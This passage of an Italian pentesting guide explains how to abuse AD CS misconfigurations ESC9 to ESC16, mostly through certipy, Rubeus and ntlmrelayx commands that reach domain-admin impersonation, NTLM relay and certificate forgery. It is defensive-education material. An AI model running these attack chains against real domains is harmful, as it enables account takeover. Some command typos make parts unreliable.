certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo volutamente la parte di dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Questa modifica non viola i vincoli, dato che `Administrator@corp.local` rimane distinto come `userPrincipalName` di `Administrator`.

Successivamente, il template di certificato `ESC9`, contrassegnato come vulnerabile, viene richiesto da `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Si nota che il `userPrincipalName` del certificato riflette `Administrator`, privo di qualsiasi “object SID”.

Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo originale, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Il tentativo di autenticazione con il certificato emesso ora restituisce l'NT hash di `Administrator@corp.local`. Il comando deve includere `-domain <domain>` a causa della mancanza di specificazione del dominio nel certificato:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappature deboli dei certificati - ESC10

### Spiegazione

ESC10 fa riferimento a due valori del registro sul domain controller:

- Il valore predefinito per `CertificateMappingMethods` sotto `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` è `0x18` (`0x8 | 0x10`), precedentemente impostato a `0x1F`.
- L'impostazione predefinita per `StrongCertificateBindingEnforcement` sotto `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` è `1`, precedentemente `0`.

**Caso 1**

Quando `StrongCertificateBindingEnforcement` è configurato come `0`.

**Caso 2**

Se `CertificateMappingMethods` include il bit `UPN` (`0x4`).

### Caso di abuso 1

Con `StrongCertificateBindingEnforcement` configurato come `0`, un account A con permessi `GenericWrite` può essere sfruttato per compromettere qualsiasi account B.

Ad esempio, avendo permessi `GenericWrite` su `Jane@corp.local`, un attaccante mira a compromettere `Administrator@corp.local`. La procedura è analoga a ESC9, permettendo l'uso di qualsiasi template di certificato.

Inizialmente, l'hash di `Jane` viene recuperato usando Shadow Credentials, sfruttando il `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione di un vincolo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Successivamente, per `Jane` viene richiesto un certificato che abilita l'autenticazione client, utilizzando il template predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene poi ripristinato al suo valore originale, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L'autenticazione con il certificato ottenuto restituirà l'NT hash di `Administrator@corp.local`, pertanto è necessario specificare il dominio nel comando a causa dell'assenza dei dettagli del dominio nel certificato.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso di abuso 2

Con i `CertificateMappingMethods` che contengono il bit flag `UPN` (`0x4`), un account A con permessi `GenericWrite` può compromettere qualsiasi account B privo della proprietà `userPrincipalName`, inclusi gli account macchina e l'amministratore di dominio integrato `Administrator`.

Qui, l'obiettivo è compromettere `DC$@corp.local`, iniziando dall'ottenere l'hash di `Jane` tramite Shadow Credentials, sfruttando il `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Il `userPrincipalName` di `Jane` viene quindi impostato su `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Viene richiesto un certificato per l'autenticazione del client come `Jane` usando il template predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene ripristinato al suo valore originale dopo questo processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Per autenticarsi via Schannel, si utilizza l'opzione `-ldap-shell` di Certipy, che indica il successo dell'autenticazione come `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Attraverso la shell LDAP, comandi come `set_rbcd` abilitano attacchi Resource-Based Constrained Delegation (RBCD), compromettendo potenzialmente il domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Questa vulnerabilità si estende anche a qualsiasi account utente privo di `userPrincipalName` o in cui questo non corrisponda a `sAMAccountName`, con il predefinito `Administrator@corp.local` che rappresenta un obiettivo primario a causa dei suoi privilegi LDAP elevati e dell'assenza, per impostazione predefinita, di un `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Spiegazione

Se il CA Server non è configurato con `IF_ENFORCEENCRYPTICERTREQUEST`, ciò può permettere NTLM relay attacks senza firma tramite il servizio RPC. [Riferimento](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puoi usare `certipy` per enumerare se `Enforce Encryption for Requests` è Disabled e certipy mostrerà le Vulnerabilità `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario di abuso

È necessario configurare un relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Per i domain controller, dobbiamo specificare `-template` in DomainController.

Oppure usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Spiegazione

Gli amministratori possono configurare la Certificate Authority per memorizzarla su un dispositivo esterno come lo Yubico YubiHSM2.

Se il dispositivo USB è collegato al server CA tramite una porta USB, o a un USB device server nel caso in cui il server CA sia una macchina virtuale, è richiesta una chiave di autenticazione (talvolta chiamata "password") per permettere al Key Storage Provider di generare e utilizzare le chiavi nel YubiHSM.

Questa chiave/password è memorizzata nel registro sotto `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in chiaro.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenario di abuso

Se la chiave privata della CA è memorizzata su un dispositivo USB fisico e si ottiene shell access, è possibile recuperare la chiave.

Per prima cosa, è necessario ottenere il certificato della CA (è pubblico) e poi:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Infine, usa il comando certutil `-sign` per forgiare un nuovo certificato arbitrario usando il certificato CA e la sua chiave privata.

## OID Group Link Abuse - ESC13

### Spiegazione

L'attributo `msPKI-Certificate-Policy` permette di aggiungere la issuance policy al template del certificato. Gli oggetti `msPKI-Enterprise-Oid` responsabili dell'emissione delle policy possono essere scoperti nel Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del PKI OID container. Una policy può essere collegata a un gruppo AD usando l'attributo `msDS-OIDToGroupLink` di questo oggetto, permettendo a un sistema di autorizzare un utente che presenta il certificato come se fosse membro del gruppo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In altre parole, quando un utente ha il permesso di richiedere un certificato e il certificato è collegato a un gruppo OID, l'utente può ereditare i privilegi di quel gruppo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) per trovare OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario di abuso

Trova un permesso utente che può essere usato con `certipy find` o `Certify.exe find /showAllPermissions`.

Se `John` ha il permesso di eseguire l'enrollment per `VulnerableTemplate`, l'utente può ereditare i privilegi del gruppo `VulnerableGroup`.

Tutto quello che deve fare è specificare il template: otterrà un certificato con i diritti OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configurazione vulnerabile del rinnovo dei certificati - ESC14

### Spiegazione

La descrizione su https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping è notevolmente completa. Di seguito una citazione del testo originale.

ESC14 affronta le vulnerabilità derivanti da una "weak explicit certificate mapping", principalmente attraverso l'uso improprio o una configurazione insicura dell'attributo `altSecurityIdentities` sugli account utente o computer di Active Directory. Questo attributo multivalore permette agli amministratori di associare manualmente certificati X.509 a un account AD per scopi di autenticazione. Quando popolato, questo mapping esplicito può sovrascrivere la logica di mapping dei certificati predefinita, che tipicamente si basa su UPNs o nomi DNS nel SAN del certificato, o sul SID incorporato nell'estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`.

Una mappatura "debole" si verifica quando il valore stringa usato all'interno dell'attributo `altSecurityIdentities` per identificare un certificato è troppo ampio, facilmente indovinabile, si basa su campi del certificato non unici o utilizza componenti del certificato facilmente contraffabili. Se un attaccante può ottenere o creare un certificato i cui attributi corrispondono a una tale mappatura esplicita definita debolmente per un account privilegiato, può usare quel certificato per autenticarsi e impersonare quell'account.

Esempi di possibili stringhe di mapping deboli in `altSecurityIdentities` includono:

- Mappatura basata esclusivamente su un Common Name (CN) del Subject comune: p.es., `X509:<S>CN=SomeUser`. Un attaccante potrebbe riuscire a ottenere un certificato con quel CN da una fonte meno sicura.
- Uso di Issuer Distinguished Names (DN) o Subject DNs eccessivamente generici senza ulteriore qualificazione come un numero di seriale specifico o subject key identifier: p.es., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Impiego di altri pattern prevedibili o identificatori non crittografici che un attaccante potrebbe soddisfare in un certificato che può legittimamente ottenere o forgiare (se ha compromesso una CA o trovato un template vulnerabile come in ESC1).

L'attributo `altSecurityIdentities` supporta vari formati per il mapping, come ad esempio:

- `X509:<I>IssuerDN<S>SubjectDN` (mappa per Issuer e Subject DN completi)
- `X509:<SKI>SubjectKeyIdentifier` (mappa per il valore dell'estensione Subject Key Identifier del certificato)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mappa per numero di seriale, implicitamente qualificato dall'Issuer DN) - questo non è un formato standard, solitamente è `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mappa per un nome RFC822, tipicamente un indirizzo email, dal SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mappa per un hash SHA1 della raw public key del certificato - generalmente forte)

La sicurezza di questi mapping dipende fortemente dalla specificità, dall'unicità e dalla robustezza crittografica degli identificatori di certificato scelti nella stringa di mapping. Anche con modalità di certificate binding forti abilitate sui Domain Controller (che influenzano principalmente i mapping impliciti basati su SAN UPNs/DNS e l'estensione SID), una voce `altSecurityIdentities` configurata male può comunque rappresentare una via diretta per l'impersonificazione se la logica di mapping stessa è difettosa o troppo permissiva.
### Scenario di abuso

ESC14 prende di mira le **explicit certificate mappings** in Active Directory (AD), specificamente l'attributo `altSecurityIdentities`. Se questo attributo è impostato (per progetto o per errata configurazione), gli attaccanti possono impersonare account presentando certificati che corrispondono al mapping.

#### Scenario A: L'attaccante può scrivere in `altSecurityIdentities`

**Precondizione**: L'attaccante ha permessi di scrittura sull'attributo `altSecurityIdentities` dell'account target oppure il permesso per concederlo sotto forma di uno dei seguenti permessi sull'oggetto AD target:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Il target ha una mappatura debole via X509RFC822 (Email)

- **Precondizione**: Il target ha una mappatura X509RFC822 debole in altSecurityIdentities. Un attaccante può impostare l'attributo mail della vittima per farlo corrispondere al nome X509RFC822 del target, richiedere un certificato come la vittima e usarlo per autenticarsi come il target.
#### Scenario C: Il target ha una mappatura X509IssuerSubject

- **Precondizione**: Il target ha una mappatura esplicita X509IssuerSubject in `altSecurityIdentities` debole. L'attaccante può impostare l'attributo `cn` o `dNSHostName` su un principal vittima per farlo corrispondere al subject della mappatura X509IssuerSubject del target. Poi, l'attaccante può richiedere un certificato come la vittima e usare questo certificato per autenticarsi come il target.
#### Scenario D: Il target ha una mappatura X509SubjectOnly

- **Precondizione**: Il target ha una mappatura esplicita X509SubjectOnly in `altSecurityIdentities` debole. L'attaccante può impostare l'attributo `cn` o `dNSHostName` su un principal vittima per farlo corrispondere al subject della mappatura X509SubjectOnly del target. Poi, l'attaccante può richiedere un certificato come la vittima e usare questo certificato per autenticarsi come il target.
### operazioni concrete
#### Scenario A

Richiedere un certificato dal template di certificato `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Salva e converti il certificato
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticarsi (utilizzando il certificato)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Pulizia (opzionale)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Per metodi di attacco più specifici in diversi scenari di attacco, fare riferimento a: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Politiche di Applicazione(CVE-2024-49019) - ESC15

### Spiegazione

La descrizione su https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc è straordinariamente dettagliata. Di seguito una citazione del testo originale.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuso

Quanto segue fa riferimento a [questo link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Clicca per vedere metodi di utilizzo più dettagliati.


Il comando `find` di Certipy può aiutare a identificare template V1 potenzialmente suscettibili a ESC15 se la CA non è aggiornata.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Impersonamento diretto via Schannel

**Passo 1: Richiedere un certificato, iniettando la Application Policy "Client Authentication" e l'UPN di destinazione.** L'attaccante `attacker@corp.local` prende di mira `administrator@corp.local` usando il template "WebServer" V1 (che permette il subject fornito dal richiedente).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Il template V1 vulnerabile con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inserisce l'OID `1.3.6.1.5.5.7.3.2` nell'estensione Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Imposta l'UPN nel SAN per l'impersonazione.

**Passo 2: Autenticarsi tramite Schannel (LDAPS) usando il certificato ottenuto.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Passo 1: Richiedere un certificato da un V1 template (con "Enrollee supplies subject"), iniettando la Application Policy "Certificate Request Agent".** Questo certificato è per l'attacker (`attacker@corp.local`) per diventare un enrollment agent. Non viene specificato alcun UPN per l'identità dell'attacker qui, poiché l'obiettivo è la capacità di agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inietta OID `1.3.6.1.4.1.311.20.2.1`.

**Passo 2: Usa il certificato "agent" per richiedere un certificato per conto di un utente privilegiato target.** Questo è un passo ESC3-like, usando il certificato del Passo 1 come certificato agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Passo 3: Autenticarsi come l'utente privilegiato usando il certificato "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Estensione di sicurezza disabilitata sulla CA (globalmente)-ESC16

### Spiegazione

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** si riferisce allo scenario in cui, se la configurazione di AD CS non impone l'inclusione dell'estensione **szOID_NTDS_CA_SECURITY_EXT** in tutti i certificati, un attaccante può sfruttare ciò tramite:

1. Richiedere un certificato **senza SID binding**.

2. Usare questo certificato **per l'autenticazione come qualsiasi account**, ad esempio impersonando un account ad alto privilegio (es. un Amministratore di dominio).

Puoi anche consultare questo articolo per saperne di più sul principio dettagliato: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

Quanto segue fa riferimento a [questo link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Clicca per vedere metodi d'uso più dettagliati.

Per identificare se l'ambiente Active Directory Certificate Services (AD CS) è vulnerabile a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Passo 1: Leggi l'UPN iniziale dell'account vittima (Opzionale - per il ripristino).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Passo 2: Aggiorna l'UPN dell'account della vittima con l'`sAMAccountName` dell'amministratore target.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Passo 3: (Se necessario) Ottenere le credenziali per l'account "victim" (ad es., tramite Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Passaggio 4: Richiedi un certificato come utente "victim" da _qualsiasi template di autenticazione client adatto_ (es., "User") sulla CA vulnerabile a ESC16.** Poiché la CA è vulnerabile a ESC16, ometterà automaticamente l'estensione di sicurezza SID dal certificato emesso, indipendentemente dalle impostazioni specifiche del template per questa estensione. Imposta la variabile d'ambiente per il Kerberos credential cache (comando shell):
```bash
export KRB5CCNAME=victim.ccache
```
Quindi richiedi il certificato:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Passo 5: Ripristina l'UPN dell'account "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Passo 6: Autenticarsi come l'amministratore di destinazione.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

La configurazione per il **cross-forest enrollment** è resa relativamente semplice. Il **root CA certificate** dalla resource forest viene **pubblicato nelle account forests** dagli amministratori, e i certificati della **enterprise CA** dalla resource forest vengono **aggiunti ai contenitori `NTAuthCertificates` e AIA in ogni account forest**. Per chiarire, con questa disposizione viene concesso alla **CA nella resource forest il controllo completo** su tutte le altre foreste per le quali gestisce la PKI. Se questa CA venisse **compromessa dagli attacker**, i certificati per tutti gli utenti sia nella resource che nelle account forests potrebbero essere **falsificati da questi**, compromettendo così il perimetro di sicurezza della foresta.

### Enrollment Privileges Granted to Foreign Principals

Negli ambienti multi-forest è richiesta cautela riguardo alle Enterprise CAs che **pubblicano certificate templates** che permettono a **Authenticated Users o foreign principals** (utenti/gruppi esterni alla foresta a cui appartiene l’Enterprise CA) i **diritti di enrollment e modifica**. Al momento dell’autenticazione attraverso un trust, l’**Authenticated Users SID** viene aggiunto al token dell’utente da AD. Pertanto, se un dominio possiede un’Enterprise CA con un template che **consente a Authenticated Users i diritti di enrollment**, un template potrebbe potenzialmente essere **enrolled da un utente di una foresta diversa**. Allo stesso modo, se i **diritti di enrollment sono esplicitamente concessi a un foreign principal da un template**, viene così creato un **cross-forest access-control relationship**, permettendo a un principal di una foresta di **enrollarsi in un template di un’altra foresta**.

Entrambi gli scenari portano a un **aumento della attack surface** da una foresta all’altra. Le impostazioni del certificate template potrebbero essere sfruttate da un attacker per ottenere privilegi aggiuntivi in un dominio esterno.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
